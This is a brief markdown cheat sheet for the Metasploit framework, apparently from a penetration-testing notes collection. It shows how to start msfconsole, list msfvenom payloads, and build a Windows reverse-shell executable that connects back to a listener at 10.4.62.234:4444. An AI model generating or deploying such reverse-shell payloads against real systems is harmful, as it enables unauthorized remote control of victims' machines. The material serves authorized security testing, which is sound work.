---
title: Metasploit
desc: Provides security vulnerabilities and exploit using payloads. It contains Msfconsole, Msfvenom
tags: [ActiveRecon, Linux]
alts: [ExploitDB, Gobuster, Searchsploit]
website:
---

## Msfconsole

```sh
msfconsole
```

## Msfvenom - Standalone payload geenrator

```sh
# Get payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows | grep reverse | grep shell

# Show options
msfvenom -p windows/shell_reverse_tcp --list-options

# Set options and execute
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.62.234 LPORT=4444 -f exe > rshell.exe
```